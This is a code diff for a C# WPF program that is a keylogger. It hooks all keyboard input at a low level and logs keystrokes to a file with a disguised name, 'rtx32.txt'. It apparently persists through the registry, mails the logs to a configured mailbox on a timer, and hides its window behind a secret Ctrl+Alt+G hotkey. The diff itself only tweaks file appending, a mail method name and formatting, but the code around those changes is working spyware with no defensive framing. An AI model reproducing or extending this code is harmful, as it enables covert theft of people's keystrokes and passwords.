@@ -4,7 +4,6 @@ using System.Windows.Input;
 using System.IO;
 using System.ComponentModel;
 using DesktopWPFAppLowLevelKeyboardHook;
-using Microsoft.Win32;
 
 namespace WpfApplication8
 {
@@ -13,7 +12,7 @@ namespace WpfApplication8
         private static System.Timers.Timer aTimer;
         bool condition = true;
         string mailbox;
-        StreamWriter file = new StreamWriter(@"rtx32.txt");
+        StreamWriter file = File.AppendText(@"rtx32.txt");
         PressingHandle pressinghandle = new PressingHandle();
         private LowLevelKeyboardListener _listener;
         AddingToRegistry addingtoregistry = new AddingToRegistry();
@@ -57,7 +56,7 @@ namespace WpfApplication8
         private void Mail_button(object sender, RoutedEventArgs e)
         {
             mailbox = mailBox.Text;
-            mailhandler.SetTimer(aTimer, mailbox);
+            mailhandler.CheckMails(aTimer, mailbox);
             Console.WriteLine(mailbox);
         }
 
@@ -65,7 +64,6 @@ namespace WpfApplication8
         {
             _listener = new LowLevelKeyboardListener();
             _listener.OnKeyPressed += _listener_OnKeyPressed;
-
             _listener.HookKeyboard();
         }
 
@@ -86,10 +84,13 @@ namespace WpfApplication8
                 }
                 file.Flush();
             }
-            if (Keyboard.IsKeyDown(Key.G) && Keyboard.IsKeyDown(Key.LeftCtrl) && Keyboard.IsKeyDown(Key.LeftAlt) || Keyboard.IsKeyDown(Key.G) && Keyboard.IsKeyDown(Key.RightCtrl) && Keyboard.IsKeyDown(Key.RightAlt))
-            {
+            if (Keyboard.IsKeyDown(Key.G)
+                && Keyboard.IsKeyDown(Key.LeftCtrl)
+                && Keyboard.IsKeyDown(Key.LeftAlt)
+                || Keyboard.IsKeyDown(Key.G)
+                && Keyboard.IsKeyDown(Key.RightCtrl)
+                && Keyboard.IsKeyDown(Key.RightAlt))
                 this.Show();
-            }
         }
     }
 }
